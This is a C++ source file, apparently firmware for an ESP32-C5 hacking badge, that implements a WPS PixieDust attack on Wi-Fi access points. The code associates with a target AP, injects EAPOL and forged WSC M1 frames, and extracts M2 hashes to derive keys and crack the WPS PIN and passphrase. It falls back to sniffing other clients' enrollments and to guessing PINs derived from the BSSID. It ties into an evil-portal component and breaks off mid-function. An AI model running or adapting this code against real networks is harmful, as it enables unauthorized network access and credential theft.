// WpsAttack.cpp – WPS PixieDust attack for ESP32-C5 Pwnterrey Badge
//
// ARCHITECTURE:
//
// Attempt 1A — Native WPS API test (THIS IS THE NEW EXPERIMENT):
//   Tests esp_wifi_wps_enable() with CORRECT ordering on C5:
//   1. esp_wifi_set_promiscuous(false) UNCONDITIONALLY + delay(100)
//   2. WiFi.softAPdisconnect(true) — tear down management AP
//   3. WiFi.mode(WIFI_STA) — pure STA-only mode as SDK requires
//   4. esp_wifi_set_config(WIFI_IF_STA, target_ssid+bssid+channel) BEFORE wps_enable
//   5. Register WPS event handlers
//   6. esp_wifi_wps_enable(&config) — WPS_TYPE_PIN
//   7. If enable succeeds: esp_wifi_wps_start(0)
//   8. Wait for WPS events (SUCCESS/FAILED/TIMEOUT)
//   If it crashes: per-step breadcrumbs reveal which call crashes.
//   After test: restore WIFI_AP_STA + rearm management AP.
//
// Attempt 1B — Associate + EAPOL injection (fallback if native WPS fails):
//   RATIONALE: esp_wifi_80211_tx() on C5 returns ESP_ERR_NO_MEM (0x101) for DATA
//   frames without an active BSS context — the driver has no TX descriptor slot.
//   Solution: associate first via esp_wifi_connect(), then inject EAPOL-Start as a
//   DATA frame within the associated session. If association is rejected (e.g. AP
//   is WPS-only and C5 driver adds RSN IE causing rejection), fall through to A2.
//   Flow:
//   esp_wifi_set_promiscuous(false) unconditionally → WiFi.disconnect() →
//   esp_wifi_set_config(STA, target_ssid+channel, OPEN) → esp_wifi_connect() →
//   Wait STA_CONNECTED event (8s timeout) →
//   Enable promiscuous → inject EAPOL-Start (DATA frame, ToDS=1) →
//   AP → EAP-Request/Identity → EAP-Identity-Response →
//   AP sends WSC-Start → send WSC M1 (our PKE, E-Nonce) →
//   AP sends M2: capture PKR, R-Nonce, R-Hash1 (0x103D), R-Hash2 (0x103E) →
//   Derive AuthKey → Run PixieDust → find AP's PIN.
//
// Attempt 2 — Passive capture (observing other clients' WPS enrollment):
//   Promiscuous: capture M1 (from enrollee client) + M2 (from AP)
//   From M2: PKR, R-Nonce, R-Hash1, R-Hash2
//   Try PixieDust with auth_key=zeros (works on some extremely weak APs)
//   Print captured data for offline use
//
// Attempt 3 — PIN candidate list:
//   WpsPinGen generates 7 BSSID-derived PIN candidates
//   Print for manual use
//
// EAP frame structure (after EAPOL Version+Type+Len = 4 bytes):
//   [0] Code (1=Req, 2=Resp, 3=Success, 4=Failure)
//   [1] Id
//   [2..3] Length (total EAP frame)
//   [4] Type (1=Identity, 254=Expanded for WSC)
//   For Expanded (WSC):
//     [5..7]   VendorID = 00:37:2A (WFA)
//     [8..11]  VendorType = 00:00:00:01
//     [12]     OpCode (01=WSC-Start, 04=WSC_MSG, 05=WSC_ACK, 06=WSC_NACK, 07=WSC_Done)
//     [13]     Flags
//     [14...]  WSC TLV data (Message Type, attributes...)
//
#include "WpsAttack.h"
#include "esp_wps.h"

// ── C-linkage forward declaration for the sniffer callback in WiFiScan.cpp ───
extern "C" void wifi_scan_wps_sniffer_cb(void*, wifi_promiscuous_pkt_type_t);

// ── Static members ────────────────────────────────────────────────────────────
WpsAttack           *WpsAttack::instance        = nullptr;
volatile bool        WpsAttack::_sta_connected  = false;
volatile bool        WpsAttack::_sta_disconnected = false;
volatile int         WpsAttack::_wpsResult      = WPS_RESULT_PENDING;
char                 WpsAttack::_s_passphrase[65] = {0};
char                 WpsAttack::_s_ssid[33]       = {0};

// ── Static members for native WPS API test ───────────────────────────────────
volatile bool WpsAttack::_nwps_success = false;
volatile bool WpsAttack::_nwps_failed  = false;
volatile bool WpsAttack::_nwps_timeout = false;
char          WpsAttack::_nwps_ssid[33]       = {0};
char          WpsAttack::_nwps_passphrase[65] = {0};

// ── Enrollee UUID (deterministic) ────────────────────────────────────────────
static const uint8_t WPS_UUID_E[16] = {
    0x50, 0x77, 0x6E, 0x74, 0x72, 0x72, 0x79, 0x43,  // "PwntrryC"
    0x35, 0x42, 0x61, 0x64, 0x67, 0x65, 0x01, 0x00   // "5Badge\x01\x00"
};

// ── Sequence counter for 802.11 frames ───────────────────────────────────────
static uint16_t s_dot11_seq = 0x10;

// ── WiFi event handler ────────────────────────────────────────────────────────
void WpsAttack::wifiEventHandler(void* arg, esp_event_base_t event_base,
                                  int32_t event_id, void* event_data)
{
    if (event_base != WIFI_EVENT) return;
    switch (event_id) {
    case WIFI_EVENT_STA_CONNECTED:
        Serial.println("[WPS] WiFi event: STA_CONNECTED");
        _sta_connected    = true;
        _sta_disconnected = false;
        _wpsResult = WPS_RESULT_CONNECTED;
        break;
    case WIFI_EVENT_STA_DISCONNECTED: {
        wifi_event_sta_disconnected_t *ev = (wifi_event_sta_disconnected_t*)event_data;
        int reason = ev ? ev->reason : -1;
        // Reason 2 (AUTH_EXPIRE) or 15 (4-WAY_HANDSHAKE_TIMEOUT) are normal for WPS-only APs
        // that reject the C5 driver's RSN IE. Fall through to passive.
        Serial.printf("[WPS] WiFi event: STA_DISCONNECTED reason=%d\n", reason);
        _sta_connected    = false;
        _sta_disconnected = true;
        break;
    }
    default: break;
    }
}

// ── Native WPS API event handler ─────────────────────────────────────────────
void WpsAttack::nativeWpsEventHandler(void* arg, esp_event_base_t event_base,
                                       int32_t event_id, void* event_data)
{
    if (event_base != WIFI_EVENT) return;
    switch (event_id) {
    case WIFI_EVENT_STA_WPS_ER_SUCCESS: {
        Serial.println("[NWPS] *** WPS_ER_SUCCESS ***");
        wifi_event_sta_wps_er_success_t *ev =
            (wifi_event_sta_wps_er_success_t*)event_data;
        if (ev && ev->ap_cred_cnt > 0) {
            // Copy SSID and passphrase (null-terminated in event struct)
            memset(_nwps_ssid, 0, sizeof(_nwps_ssid));
            memset(_nwps_passphrase, 0, sizeof(_nwps_passphrase));
            // ssid is not null-terminated in event struct, max 32 bytes
            int ssid_len = strnlen((char*)ev->ap_cred[0].ssid, MAX_SSID_LEN);
            memcpy(_nwps_ssid, ev->ap_cred[0].ssid, ssid_len);
            int pass_len = strnlen((char*)ev->ap_cred[0].passphrase, MAX_PASSPHRASE_LEN);
            memcpy(_nwps_passphrase, ev->ap_cred[0].passphrase, pass_len);
            Serial.printf("[NWPS] SSID=%s passphrase=%s\n", _nwps_ssid, _nwps_passphrase);
        } else {
            Serial.println("[NWPS] WPS success but no AP credentials in event");
        }
        _nwps_success = true;
        break;
    }
    case WIFI_EVENT_STA_WPS_ER_FAILED: {
        wifi_event_sta_wps_fail_reason_t reason =
            WPS_FAIL_REASON_NORMAL;
        if (event_data)
            reason = *(wifi_event_sta_wps_fail_reason_t*)event_data;
        Serial.printf("[NWPS] WPS_ER_FAILED reason=%d\n", (int)reason);
        _nwps_failed = true;
        break;
    }
    case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
        Serial.println("[NWPS] WPS_ER_TIMEOUT");
        _nwps_timeout = true;
        break;
    case WIFI_EVENT_STA_WPS_ER_PIN: {
        wifi_event_sta_wps_er_pin_t *pin_ev =
            (wifi_event_sta_wps_er_pin_t*)event_data;
        if (pin_ev) {
            char pin_str[9];
            memcpy(pin_str, pin_ev->pin_code, 8);
            pin_str[8] = '\0';
            Serial.printf("[NWPS] WPS_ER_PIN: %s\n", pin_str);
        }
        break;
    }
    default: break;
    }
}

// ── Constructor / Destructor ──────────────────────────────────────────────────
WpsAttack::WpsAttack()
    : _state(WPS_STATE_IDLE), _mode(WPS_ATTACK_MODE_FULL),
      _attempt(0), _stateTimestamp(0), _pinIdx(0),
      _tx_len(0), _eap_id(0), _eap_seq(0x80)
{
    memset(_foundPin, 0, sizeof(_foundPin));
    memset(_foundPassphrase, 0, sizeof(_foundPassphrase));
    memset(_foundSSID, 0, sizeof(_foundSSID));
    memset(_our_mac, 0, sizeof(_our_mac));
    memset(&_capture, 0, sizeof(_capture));
    _statusMsg = "";
    instance = this;
}

WpsAttack::~WpsAttack() {
    stop();
    if (instance == this) instance = nullptr;
}

// ── State management ──────────────────────────────────────────────────────────
void WpsAttack::setState(uint8_t s, const char *msg) {
    _state = s;
    _stateTimestamp = millis();
    if (msg) {
        _statusMsg = String(msg);
        Serial.println(msg);
    }
}

// ── begin() ──────────────────────────────────────────────────────────────────
void WpsAttack::begin(const AccessPoint &ap, uint8_t mode) {
    _ap      = ap;
    _mode    = mode;
    _attempt = 0;
    _pinIdx  = 0;
    memset(&_capture, 0, sizeof(_capture));
    memset(_foundPin, 0, sizeof(_foundPin));
    memset(_foundPassphrase, 0, sizeof(_foundPassphrase));
    memset(_foundSSID, 0, sizeof(_foundSSID));
    _eap_seq = 0x80;

    esp_wifi_get_mac(WIFI_IF_STA, _our_mac);
    _sta_connected   = false;
    _sta_disconnected = false;
    _wpsResult       = WPS_RESULT_PENDING;

    if (_wifi_event_instance) {
        esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                              _wifi_event_instance);
        _wifi_event_instance = nullptr;
    }
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                        &WpsAttack::wifiEventHandler,
                                        nullptr, &_wifi_event_instance);

    _pins = WpsPinGen::getAllPins(ap.bssid);

    Serial.printf("[WPS] Target: %s CH:%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X WPS=%s\n",
                  ap.essid.c_str(), ap.channel,
                  ap.bssid[0], ap.bssid[1], ap.bssid[2],
                  ap.bssid[3], ap.bssid[4], ap.bssid[5],
                  ap.wpsPresent ? "YES" : "NO");
    Serial.printf("[WPS] Our MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  _our_mac[0], _our_mac[1], _our_mac[2],
                  _our_mac[3], _our_mac[4], _our_mac[5]);
    Serial.printf("[WPS] Mode=%d  PIN candidates=%d\n", (int)mode, (int)_pins.size());

    if (mode == WPS_ATTACK_MODE_PASSIVE) {
        _startPassiveCapture();
    } else {
        _startAttempt1();
    }
}

// ════════════════════════════════════════════════════════════════════════════
// ATTEMPT 1: Raw EAPOL injection via promiscuous + 80211_tx
// No association required — inject EAPOL-Start to AP BSSID directly
// ════════════════════════════════════════════════════════════════════════════

// ════════════════════════════════════════════════════════════════════════════
// ATTEMPT 1: Associate + EAPOL injection
//
// esp_wifi_80211_tx() on C5 returns ESP_ERR_NO_MEM (0x101) for DATA frames
// unless the STA interface has an active BSS context (tx descriptor pool is
// allocated only after association). We must associate first, then enable
// promiscuous and inject EAPOL-Start within that session.
//
// CRITICAL ORDERING (C5 ROM constraints):
//   1. esp_wifi_set_promiscuous(false) UNCONDITIONALLY — C5 ROM crashes if
//      promiscuous is active when reconfiguring STA (Load access fault).
//   2. WiFi.disconnect() — clear any stale association.
//   3. esp_wifi_set_config() with target SSID/channel BEFORE connecting.
//   4. esp_wifi_connect() — driver handles Auth+Assoc internally.
//   5. Wait WPS_CONNECT_TIMEOUT_MS for STA_CONNECTED or STA_DISCONNECTED.
//   6. On connect: enable promiscuous AFTER association (tx pool now exists).
//   7. Inject EAPOL-Start and proceed with EAP state machine.
//   8. On disconnect/timeout: fall through to passive capture (A2).
//
// NOTE: esp_wifi_wps_enable() is NEVER called — it crashes C5 ROM with a
// Load access fault at MEPC 0x4003858e (NULL vtable dereference in blob).
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::_startAttempt1() {
    // NOTE: esp_wifi_wps_enable() was tested 2026-11-07 with CORRECT order
    // (promisc off, STA-only, set_config before) and CRASHES on C5 ROM at
    // MEPC 0x4003858e (Load Access Fault, NULL vtable dereference in blob).
    // Native WPS API path is permanently closed. Proceeding to EAPOL injection.
    _startAttempt1_eapol();
}

// ── Restore WIFI_AP_STA + rearm management AP after native WPS test ───────────
void WpsAttack::_nativeWpsCleanup() {
    Serial.println("[NWPS] Cleanup: disabling WPS handlers and restoring WIFI_AP_STA...");
    if (_nwps_event_instance) {
        esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                              _nwps_event_instance);
        _nwps_event_instance = nullptr;
    }
    // Restore management AP
    extern EvilPortal evil_portal_obj;
    WiFi.mode(WIFI_AP_STA);
    delay(100);
    evil_portal_obj.rearmManagementAP();
    Serial.println("[NWPS] Cleanup done. Management AP restored.");
}

// ── Native WPS loop — polls for WPS events ───────────────────────────────────
void WpsAttack::_nativeWpsLoop(uint32_t now) {
    uint32_t elapsed = (now >= _stateTimestamp) ? (now - _stateTimestamp) : 0;

    if (_nwps_success) {
        Serial.println("[NWPS] *** SUCCESS *** Native WPS handshake complete!");
        Serial.printf("[NWPS] SSID=%s passphrase=%s\n", _nwps_ssid, _nwps_passphrase);
        // Store results
        strlcpy(_foundSSID, _nwps_ssid, sizeof(_foundSSID));
        strlcpy(_foundPassphrase, _nwps_passphrase, sizeof(_foundPassphrase));
        esp_wifi_wps_disable();
        char msg[160];
        snprintf(msg, sizeof(msg),
                 "[WPS] *** NATIVE WPS SUCCESS *** SSID=%s PASS=%s AP=%s",
                 _nwps_ssid, _nwps_passphrase, _ap.essid.c_str());
        _nativeWpsCleanup();
        setState(WPS_STATE_PIN_FOUND, msg);
        return;
    }

    if (_nwps_failed) {
        Serial.println("[NWPS] Native WPS FAILED. Falling through to EAPOL injection.");
        esp_wifi_wps_disable();
        _nativeWpsCleanup();
        _startAttempt1_eapol();
        return;
    }

    if (_nwps_timeout) {
        Serial.println("[NWPS] Native WPS TIMEOUT. Falling through to EAPOL injection.");
        esp_wifi_wps_disable();
        _nativeWpsCleanup();
        _startAttempt1_eapol();
        return;
    }

    // Hard timeout fallback (SDK timeout event may not fire if blob crashes quietly)
    if (elapsed > WPS_NATIVE_TIMEOUT_MS) {
        Serial.printf("[NWPS] Hard timeout %ums. No WPS event received.\n", elapsed);
        esp_wifi_wps_disable();
        _nativeWpsCleanup();
        _startAttempt1_eapol();
        return;
    }

    // Status print every 15s
    static uint32_t last_nwps_status = 0;
    if (now - last_nwps_status > 15000) {
        last_nwps_status = now;
        Serial.printf("[NWPS] Waiting... %us | success=%d failed=%d timeout=%d\n",
                      elapsed / 1000,
                      (int)_nwps_success, (int)_nwps_failed, (int)_nwps_timeout);
    }
}

// ════════════════════════════════════════════════════════════════════════════
// ATTEMPT 1B: Associate + EAPOL injection (original Attempt 1, now fallback)
// ════════════════════════════════════════════════════════════════════════════

void WpsAttack::_startAttempt1_eapol() {
    _attempt = 1;  // CRITICAL: loop() dispatches on _attempt==1
    Serial.println("[WPS-A1] Attempt 1B: Associate + EAPOL injection");
    Serial.printf("[WPS-A1] Target: %s CH:%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  _ap.essid.c_str(), _ap.channel,
                  _ap.bssid[0], _ap.bssid[1], _ap.bssid[2],
                  _ap.bssid[3], _ap.bssid[4], _ap.bssid[5]);

    // Step 1: disable promiscuous UNCONDITIONALLY before any STA reconfiguration
    // (C5 ROM Load access fault if promiscuous is on during wifi_set_config).
    esp_wifi_set_promiscuous(false);
    delay(50);

    // Step 2: disconnect any stale STA association
    WiFi.disconnect(false);
    delay(100);

    // Step 3: configure STA with target SSID and channel (open auth — AP will
    // reject WPA handshake anyway; we only need the association, not encryption).
    wifi_config_t sta_cfg;
    memset(&sta_cfg, 0, sizeof(sta_cfg));
    strlcpy((char*)sta_cfg.sta.ssid, _ap.essid.c_str(), sizeof(sta_cfg.sta.ssid));
    // Set BSSID so we hit the right AP on the right channel
    sta_cfg.sta.bssid_set = true;
    memcpy(sta_cfg.sta.bssid, _ap.bssid, 6);
    sta_cfg.sta.channel = _ap.channel;
    sta_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
    esp_err_t cfg_err = esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
    if (cfg_err != ESP_OK) {
        Serial.printf("[WPS-A1] esp_wifi_set_config failed: 0x%X (%s)\n",
                      (unsigned)cfg_err, esp_err_to_name(cfg_err));
        Serial.println("[WPS-A1] Falling through to passive capture.");
        _startPassiveCapture();
        return;
    }

    // Reset capture and flags
    memset(&_capture, 0, sizeof(_capture));
    memcpy(_capture.ap_mac, _ap.bssid, 6);
    memcpy(_capture.sta_mac, _our_mac, 6);
    _sta_connected   = false;
    _sta_disconnected = false;

    // Step 4: connect — driver does Auth+Assoc internally
    esp_err_t conn_err = esp_wifi_connect();
    Serial.printf("[WPS-A1] esp_wifi_connect(): 0x%X (%s) — waiting %dms for STA_CONNECTED...\n",
                  (unsigned)conn_err, esp_err_to_name(conn_err), WPS_CONNECT_TIMEOUT_MS);

    // Stay in CONNECTING state; _attempt1Loop() polls the event flags.
    setState(WPS_STATE_CONNECTING, "[WPS-A1] Connecting to target AP (open auth)...");
}

void WpsAttack::_attempt1Loop(uint32_t now) {
    // Guard against uint32 underflow when loop() is called in the same main-loop
    // iteration as begin() (currentTime captured before setState() updated _stateTimestamp).
    uint32_t elapsed = (now >= _stateTimestamp) ? (now - _stateTimestamp) : 0;

    // ── CONNECTING: waiting for STA_CONNECTED or STA_DISCONNECTED ────────────
    if (_state == WPS_STATE_CONNECTING) {
        if (_sta_connected) {
            // Association succeeded — now enable promiscuous AFTER association
            // so the driver has an active BSS context for DATA frame TX.
            Serial.println("[WPS-A1] Associated! Enabling promiscuous for EAPOL capture...");
            const wifi_promiscuous_filter_t filt = {.filter_mask = 0xFFFFFFFF};
            esp_wifi_set_promiscuous_filter(&filt);
            esp_wifi_set_promiscuous_rx_cb(&wifi_scan_wps_sniffer_cb);
            esp_wifi_set_promiscuous(true);
            delay(50);
            setState(WPS_STATE_EAPOL_START, "[WPS-A1] Associated. Sending EAPOL-Start...");
            _sendEapolStart();
            return;
        }
        if (_sta_disconnected) {
            // AP rejected association (likely WPS-only, RSN IE rejected)
            Serial.println("[WPS-A1] Association rejected by AP → falling to passive capture.");
            _startPassiveCapture();
            return;
        }
        if (elapsed > WPS_CONNECT_TIMEOUT_MS) {
            Serial.printf("[WPS-A1] Association timeout after %ums → passive capture.\n", elapsed);
            esp_wifi_disconnect();
            _startPassiveCapture();
        }
        return;
    }

    // ── EAPOL_START: waiting for EAP-Request/Identity from AP ───────────────
    if (_state == WPS_STATE_EAPOL_START) {
        // Resend every 1.5s, up to 5 times
        // Use _eap_seq as retry counter (repurposed; reset when state entered)
        // and _stateTimestamp as the base — compute last send from elapsed.
        static int eapol_start_count = 0;
        static uint32_t last_eapol_send = 0;
        // Reset on state entry (elapsed near 0 means we just entered)
        if (elapsed < 100) { eapol_start_count = 0; last_eapol_send = 0; }
        if (elapsed > WPS_EAPOL_TIMEOUT_MS) {
            eapol_start_count = 0;
            Serial.println("[WPS-A1] No EAP-Request after EAPOL-Start. AP didn't respond.");
            Serial.println("[WPS-A1] AP may require association or WPS not active.");
            _startPassiveCapture();
            return;
        }
        if (now - last_eapol_send > 1500) {
            last_eapol_send = now;
            eapol_start_count++;
            if (eapol_start_count <= 5) {
                Serial.printf("[WPS-A1] Resending EAPOL-Start (%d/5)...\n", eapol_start_count);
                _sendEapolStart();
            }
        }
        return;
    }

    // ── EAP_IDENTITY: waiting for WSC-Start ─────────────────────────────────
    if (_state == WPS_STATE_EAP_IDENTITY) {
        if (elapsed > WPS_EAPOL_TIMEOUT_MS) {
            Serial.println("[WPS-A1] No WSC-Start after Identity-Response.");
            _startPassiveCapture();
        }
        return;
    }

    // ── WSC_START: sent M1, waiting for M2 ───────────────────────────────────
    if (_state == WPS_STATE_M1_SENT) {
        if (elapsed > WPS_EAPOL_TIMEOUT_MS * 2) {
            Serial.println("[WPS-A1] No M2 received after M1 (10s timeout).");
            _startPassiveCapture();
        }
        return;
    }

    // ── PIXIE_RUNNING: triggered from handleEapolFrame ───────────────────────
    if (_state == WPS_STATE_PIXIE_RUNNING) {
        _runPixieDust();
    }
}

// ── EAPOL-Start frame (802.11 DATA, ToDS=1) ──────────────────────────────────
void WpsAttack::_sendEapolStart() {
    int len = _buildEapolStartFrame(_tx_buf, _ap.bssid, _our_mac, _ap.bssid);
    if (len <= 0) return;
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, _tx_buf, len, false);
    Serial.printf("[WPS-A1] EAPOL-Start → %02X:%02X:%02X:%02X:%02X:%02X : 0x%X (%s)\n",
                  _ap.bssid[0], _ap.bssid[1], _ap.bssid[2],
                  _ap.bssid[3], _ap.bssid[4], _ap.bssid[5],
                  (unsigned)err, esp_err_to_name(err));
}

// ── EAP-Response/Identity ─────────────────────────────────────────────────────
void WpsAttack::_sendEapIdentityResponse(uint8_t eap_id) {
    static const char *WPS_ID = "WFA-SimpleConfig-Enrollee-1-0";
    int id_len = strlen(WPS_ID);
    // EAP body = Type(1) + Identity
    uint8_t eap_body[64];
    eap_body[0] = EAP_TYPE_IDENTITY;
    memcpy(eap_body + 1, WPS_ID, id_len);
    int len = _buildEapResponseFrame(_tx_buf, _ap.bssid, _our_mac, _ap.bssid,
                                      eap_id, eap_body, 1 + id_len);
    if (len <= 0) return;
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, _tx_buf, len, false);
    Serial.printf("[WPS-A1] EAP-Identity-Response: 0x%X id=%d\n", (unsigned)err, eap_id);
    setState(WPS_STATE_EAP_IDENTITY, "[WPS-A1] Identity-Response sent. Waiting WSC-Start...");
}

// ── Build and send WSC M1 ─────────────────────────────────────────────────────
void WpsAttack::_buildAndSendM1(uint8_t eap_id) {
    Serial.println("[WPS-A1] Building M1...");

    // Generate DH keypair
    if (!_crypto.generateDHKeyPair(_capture.pke)) {
        Serial.println("[WPS-A1] DH keypair generation FAILED → passive");
        _startPassiveCapture();
        return;
    }

    // Generate E-Nonce (random)
    for (int i = 0; i < 16; i++)
        _capture.e_nonce[i] = esp_random() & 0xFF;
    _capture.has_m1 = true;

    Serial.printf("[WPS-A1] PKE[0..7]=%02X%02X%02X%02X%02X%02X%02X%02X\n",
                  _capture.pke[0], _capture.pke[1], _capture.pke[2], _capture.pke[3],
                  _capture.pke[4], _capture.pke[5], _capture.pke[6], _capture.pke[7]);
    Serial.printf("[WPS-A1] E-Nonce=%02X%02X%02X%02X...\n",
                  _capture.e_nonce[0], _capture.e_nonce[1],
                  _capture.e_nonce[2], _capture.e_nonce[3]);

    // Build M1 TLVs
    uint8_t tlv_buf[600];
    int tpos = 0;
    tpos = tlvAppend8 (tlv_buf, tpos, WPS_ATTR_VERSION,         0x10);
    tpos = tlvAppend8 (tlv_buf, tpos, WPS_ATTR_MSG_TYPE,        WPS_MSG_M1);
    tpos = tlvAppend  (tlv_buf, tpos, WPS_ATTR_UUID_E,          WPS_UUID_E, 16);
    tpos = tlvAppend  (tlv_buf, tpos, 0x1020 /*MAC_ADDRESS*/,   _our_mac, 6);
    tpos = tlvAppend  (tlv_buf, tpos, WPS_ATTR_ENROLLEE_NONCE,  _capture.e_nonce, 16);
    tpos = tlvAppend  (tlv_buf, tpos, WPS_ATTR_PUBLIC_KEY,      _capture.pke, 192);
    tpos = tlvAppend16(tlv_buf, tpos, WPS_ATTR_AUTH_TYPE_FLAGS, 0x0022);
    tpos = tlvAppend16(tlv_buf, tpos, WPS_ATTR_ENCR_TYPE_FLAGS, 0x000E);
    tpos = tlvAppend8 (tlv_buf, tpos, WPS_ATTR_CONN_TYPE_FLAGS, 0x01);
    tpos = tlvAppend16(tlv_buf, tpos, WPS_ATTR_CONFIG_METHODS,  0x0188);
    tpos = tlvAppend8 (tlv_buf, tpos, WPS_ATTR_WPS_STATE,       0x01);
    static const char *mfr    = "Espressif";
    static const char *mdl    = "ESP32-C5";
    static const char *mnum   = "1.0";
    static const char *serial = "00000001";
    static const char *dname  = "PwnterreyBadge";
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_MANUFACTURER,  (const uint8_t*)mfr,    strlen(mfr));
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_MODEL_NAME,    (const uint8_t*)mdl,    strlen(mdl));
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_MODEL_NUMBER,  (const uint8_t*)mnum,   strlen(mnum));
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_SERIAL_NUMBER, (const uint8_t*)serial, strlen(serial));
    static const uint8_t pdt[8] = {0x00,0x0A,0x00,0x50,0xF2,0x04,0x00,0x01};
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_PRIMARY_DEV_TYPE, pdt, 8);
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_DEVICE_NAME, (const uint8_t*)dname, strlen(dname));
    tpos = tlvAppend8 (tlv_buf, tpos, WPS_ATTR_RF_BANDS,         0x01);
    tpos = tlvAppend16(tlv_buf, tpos, WPS_ATTR_ASSOC_STATE,      0x0000);
    tpos = tlvAppend16(tlv_buf, tpos, WPS_ATTR_DEVICE_PASSWD_ID, 0x0000);
    tpos = tlvAppend16(tlv_buf, tpos, WPS_ATTR_CONFIG_ERROR,     0x0000);
    static const uint8_t osver[4] = {0x80,0x00,0x00,0x00};
    tpos = tlvAppend(tlv_buf, tpos, WPS_ATTR_OS_VERSION, osver, 4);
    Serial.printf("[WPS-A1] M1 TLV size: %d bytes\n", tpos);

    // Wrap in EAP-Response/Expanded (WSC_MSG opcode=0x04)
    // EAP body: Type(1=254) + VendorID(3) + VendorType(4) + OpCode(1) + Flags(1) + TLVs
    uint8_t eap_body[700];
    int epos = 0;
    eap_body[epos++] = EAP_TYPE_EXPANDED;
    eap_body[epos++] = 0x00; eap_body[epos++] = 0x37; eap_body[epos++] = 0x2A; // WFA OUI
    eap_body[epos++] = 0x00; eap_body[epos++] = 0x00; eap_body[epos++] = 0x00; eap_body[epos++] = 0x01;
    eap_body[epos++] = 0x04;  // OpCode: WSC_MSG
    eap_body[epos++] = 0x00;  // Flags
    if (epos + tpos > (int)sizeof(eap_body)) {
        Serial.println("[WPS-A1] M1 buffer overflow!");
        _startPassiveCapture();
        return;
    }
    memcpy(eap_body + epos, tlv_buf, tpos);
    epos += tpos;

    int len = _buildEapResponseFrame(_tx_buf, _ap.bssid, _our_mac, _ap.bssid,
                                      eap_id, eap_body, epos);
    if (len <= 0) { _startPassiveCapture(); return; }

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, _tx_buf, len, false);
    Serial.printf("[WPS-A1] M1 tx: 0x%X len=%d\n", (unsigned)err, len);
    setState(WPS_STATE_M1_SENT, "[WPS-A1] M1 sent. Waiting for M2 (R-Hash1/R-Hash2)...");
}

// ── Process M2 from AP: extract PKR, R-Nonce, R-Hash1, R-Hash2 ───────────────
// CRITICAL: R-Hash1 (0x103D) and R-Hash2 (0x103E) are in M2!
// These are what PixieDust cracks. E-Hash in M3 is NOT needed.
void WpsAttack::_processM2(const uint8_t *wsc_tlvs, int tlv_len, uint8_t eap_id)
{
    Serial.printf("[WPS-A1] Processing M2 (%d TLV bytes)\n", tlv_len);

    uint16_t out_len;

    // PKR (Registrar public key)
    const uint8_t *pkr = tlvFind(wsc_tlvs, tlv_len, WPS_ATTR_PUBLIC_KEY, out_len);
    if (!pkr || out_len < 192) {
        Serial.printf("[WPS-A1] M2: PKR missing (len=%d)\n", (int)out_len);
        _startPassiveCapture(); return;
    }
    memcpy(_capture.pkr, pkr, 192);

    // R-Nonce (Registrar nonce)
    const uint8_t *rn = tlvFind(wsc_tlvs, tlv_len, WPS_ATTR_REGISTRAR_NONCE, out_len);
    if (!rn || out_len < 16) {
        Serial.println("[WPS-A1] M2: R-Nonce missing");
        _startPassiveCapture(); return;
    }
    memcpy(_capture.r_nonce, rn, 16);

    // R-Hash1 (0x103D) — this is what we crack with PixieDust
    const uint8_t *rh1 = tlvFind(wsc_tlvs, tlv_len, WPS_ATTR_R_HASH1, out_len);
    if (!rh1 || out_len < 32) {
        Serial.printf("[WPS-A1] M2: R-Hash1 (0x103D) missing (len=%d) — AP may require full PIN exchange\n", (int)out_len);
        // Some APs send R-Hash in M4/M6 instead of M2.
        // Try to run pixie anyway with whatever we have after a delay.
        // Fall through — set has_m2 and try passive if pixie fails.
    } else {
        // Store R-Hash1 and R-Hash2 in e_hash1/e_hash2 fields for PixieDust
        memcpy(_capture.e_hash1, rh1, 32);
        const uint8_t *rh2 = tlvFind(wsc_tlvs, tlv_len, WPS_ATTR_R_HASH2, out_len);
        if (rh2 && out_len >= 32) {
            memcpy(_capture.e_hash2, rh2, 32);
            Serial.printf("[WPS-A1] R-Hash1=%02X%02X%02X%02X... R-Hash2=%02X%02X%02X%02X...\n",
                          _capture.e_hash1[0], _capture.e_hash1[1],
                          _capture.e_hash1[2], _capture.e_hash1[3],
                          _capture.e_hash2[0], _capture.e_hash2[1],
                          _capture.e_hash2[2], _capture.e_hash2[3]);
            _capture.has_m3 = true;  // Reuse has_m3 flag: "we have hashes ready"
        }
    }
    _capture.has_m2 = true;

    Serial.printf("[WPS-A1] PKR[0..3]=%02X%02X%02X%02X R-Nonce[0..3]=%02X%02X%02X%02X\n",
                  _capture.pkr[0], _capture.pkr[1], _capture.pkr[2], _capture.pkr[3],
                  _capture.r_nonce[0], _capture.r_nonce[1],
                  _capture.r_nonce[2], _capture.r_nonce[3]);

    // Derive DH shared secret + AuthKey (we have our private key from M1 step)
    uint8_t shared[192];
    size_t  shared_len = 0;
    if (!_crypto.deriveSharedSecret(_capture.pkr, 192, shared, shared_len)) {
        Serial.println("[WPS-A1] DH shared secret FAILED → passive");
        _startPassiveCapture(); return;
    }
    Serial.printf("[WPS-A1] DH shared secret: %d bytes\n", (int)shared_len);

    if (!_crypto.deriveAuthKey(shared, shared_len,
                                _capture.e_nonce, _capture.r_nonce,
                                _our_mac, _capture.auth_key)) {
        Serial.println("[WPS-A1] AuthKey derivation FAILED → passive");
        _startPassiveCapture(); return;
    }
    Serial.printf("[WPS-A1] AuthKey derived: %02X%02X%02X%02X...\n",
                  _capture.auth_key[0], _capture.auth_key[1],
                  _capture.auth_key[2], _capture.auth_key[3]);

    // Send WSC-ACK to tell AP we acknowledged M2
    uint8_t eap_body[12];
